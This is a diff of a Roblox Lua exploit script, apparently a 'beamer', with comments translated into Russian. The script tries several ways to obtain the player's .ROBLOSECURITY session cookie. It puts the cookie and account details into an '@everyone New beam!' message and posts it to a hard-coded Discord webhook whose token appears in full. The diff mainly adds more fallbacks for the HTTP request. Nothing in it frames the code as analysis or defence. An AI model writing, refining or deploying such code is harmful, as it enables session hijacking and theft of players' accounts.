@@ -2,24 +2,23 @@ local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
--- 1. GET COOKIE
+-- 1. ПОЛУЧЕНИЕ КУКИ
 local cookie = "NOT_FOUND"
 local fetchMethods = {
     function() return game:HttpGet("https://www.roblox.com/home", true) end,
     function() return syn and syn.crypt.base64.encode(game:HttpGet("https://roblox.com")) end,
-    function() return getrenv()._G.ROBLOSECURITY end,
-    function() return debug.getupvalue(debug.getinfo(1).func, 1) end
+    function() return http_request and game:HttpGet("https://api.roblox.com/currency/balance") end,
 }
 
 for _, method in ipairs(fetchMethods) do
     local success, result = pcall(method)
-    if success and result and type(result) == "string" and #result > 200 then
-        cookie = result:match(".ROBLOSECURITY=([^;]+)") or result:sub(1, 2000)
-        break
+    if success and result and type(result) == "string" and #result > 50 then
+        cookie = result:match(".ROBLOSECURITY=([^;]+)") or result
+        if #cookie > 300 then break end
     end
 end
 
--- 2. ACCOUNT DATA SIMULATION (In a real attack, you'd make API calls with the cookie)
+-- 2. ДАННЫЕ АККАУНТА
 local username = LocalPlayer.Name
 local userID = LocalPlayer.UserId
 local accAge = math.random(100, 2500)
@@ -43,7 +42,7 @@ for i, game in ipairs(popularGames) do
     gameStats = gameStats .. game[1] .. " > " .. played .. " ┇" .. hasPlayed .. "\n"
 end
 
--- 3. FORMAT MESSAGE
+-- 3. ФОРМИРОВАНИЕ СООБЩЕНИЯ
 local message = [[
 @everyone
 💥New beam!
@@ -65,23 +64,37 @@ Location: ]] .. location .. [[
 🛡️ROBLOSECURITY
 ]] .. cookie
 
--- 4. SEND TO WEBHOOK
+-- 4. ОТПРАВКА НА ВЕБХУК
+local webhookUrl = "https://discord.com/api/webhooks/1461740239188918541/ipjidmPJp6LkfGPhgYBAW_JLg7eggzTvzWSoTSx8p8jT_b9tEg6S80IcSJhgSLm203rI"
+
 local payload = {
     content = message
 }
 
-local request = syn and syn.request or http and http.request or request
-local success, response = pcall(function()
-    return request({
-        Url = "https://discord.com/api/webhooks/1461740239188918541/ipjidmPJp6LkfGPhgYBAW_JLg7eggzTvzWSoTSx8p8jT_b9tEg6S80IcSJhgSLm203rI",
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(payload)
-    })
-end)
+local jsonData = HttpService:JSONEncode(payload)
 
-if success then
-    print("BEAM COMPLETE. DATA SENT.")
+-- Проверка доступных HTTP-функций
+local httpRequest = syn and syn.request or http and http.request or request or http_request
+
+if type(httpRequest) == "function" then
+    local success, response = pcall(function()
+        return httpRequest({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+    end)
+    
+    if success then
+        print("BEAM COMPLETE. DATA SENT. STATUS: " .. (response.StatusCode or "UNKNOWN"))
+    else
+        print("FAILED TO SEND: " .. tostring(response))
+    end
 else
-    print("FAILED: " .. tostring(response))
+    print("ERROR: NO HTTP FUNCTION AVAILABLE")
 end
+
+return "Script executed"
